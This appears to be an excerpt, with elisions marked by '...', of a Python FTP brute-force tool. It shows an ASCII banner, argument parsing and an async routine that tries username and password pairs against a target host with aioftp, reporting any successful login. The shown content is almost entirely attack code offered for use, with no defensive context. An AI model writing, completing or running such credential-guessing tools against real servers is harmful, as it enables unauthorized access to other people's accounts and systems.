import asyncio,argparse,aioftp,colorama,random
...
╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝
        ...
        FTP BruteForce is a tool designed to guess the correct password for the given username.
''')

def get_args():
    parser = argparse.ArgumentParser(description=f"{bold}{random_color}FTP BruteForce is a tool designed to guess the correct password for the given username.")
...
async def ftp_bruteforce(hostname, username, password, port, found_flag):
    try:
        async with aioftp.Client.context(hostname, user=username, password=password, port=port) as client:
            found_flag.set()
            print(colored(
                f"{random_color}[{port}] [ftp] host:{hostname}  login:{username}  password:{password}", 'green'))

    except Exception as err:
        print(
            f"{random_color}c[Attempt] target {hostname} - login:{username} - password:{password}")
